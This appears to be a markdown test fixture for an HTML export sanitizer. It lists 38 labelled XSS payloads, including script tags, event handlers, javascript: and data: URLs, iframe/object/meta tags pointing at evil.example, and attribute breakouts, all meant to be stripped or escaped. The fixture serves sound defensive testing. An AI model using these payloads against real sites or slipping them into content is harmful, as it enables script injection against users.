# XSS / export sanitization test

Nothing in this file may execute or survive as active content in exported HTML.
Each case is labelled; the export test should assert the payload is removed or
escaped. Marker strings like `XSS-n` make assertions easy.

## Script tags

<script>alert('XSS-1')</script>

<SCRIPT SRC="https://evil.example/xss.js"></SCRIPT>

Inline <script>alert('XSS-2')</script> in a paragraph.

<scr<script>ipt>alert('XSS-3')</script>

## Event handlers

<img src="x" onerror="alert('XSS-4')">

<svg onload="alert('XSS-5')"></svg>

<div onmouseover="alert('XSS-6')">hover me</div>

<body onload=alert('XSS-7')>

<a href="#" onclick="alert('XSS-8')">click</a>

<details open ontoggle="alert('XSS-9')"><summary>x</summary></details>

## javascript: and data: URLs

[click me](javascript:alert('XSS-10'))

[mixed case](JaVaScRiPt:alert('XSS-11'))

[with whitespace](  javascript:alert('XSS-12'))

[entity-encoded](&#106;avascript:alert('XSS-13'))

[tab inside](java	script:alert('XSS-14'))

[vbscript](vbscript:msgbox('XSS-15'))

[data html](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTE2Jyk8L3NjcmlwdD4=)

![image js](javascript:alert('XSS-17'))

<a href="javascript:alert('XSS-18')">raw html link</a>

[ref link][evil]

[evil]: javascript:alert('XSS-19')

<javascript:alert('XSS-20')>

## Dangerous elements

<iframe src="https://evil.example/XSS-21"></iframe>

<object data="https://evil.example/XSS-22.swf"></object>

<embed src="https://evil.example/XSS-23.swf">

<form action="https://evil.example/XSS-24"><input type="submit"></form>

<meta http-equiv="refresh" content="0;url=https://evil.example/XSS-25">

<base href="https://evil.example/XSS-26/">

<link rel="stylesheet" href="https://evil.example/XSS-27.css">

<style>@import 'https://evil.example/XSS-28.css'; body { background: url("javascript:alert('XSS-29')") }</style>

<math><mtext><table><mglyph><style><img src=x onerror=alert('XSS-30')>

## Attribute breakouts

<img src="a.png" alt="x&quot; onerror=&quot;alert('XSS-31')">

![alt" onerror="alert('XSS-32')](assets/sample.png)

[title breakout](https://example.com "x\" onmouseover=\"alert('XSS-33')")

<div style="background-image: url(javascript:alert('XSS-34'))">styled</div>

## Must stay harmless text

Code is escaped, not executed: `<script>alert('XSS-35')</script>`

```html
<script>alert('XSS-36')</script>
<img src=x onerror=alert('XSS-37')>
```

Escaped: \<script\>alert('XSS-38')\</script\>

## Safe links that must survive

[https link](https://example.com/ok), [mailto](mailto:ok@example.com),
[relative](./gfm.md), [anchor](#script-tags), ![local image](assets/sample.png)
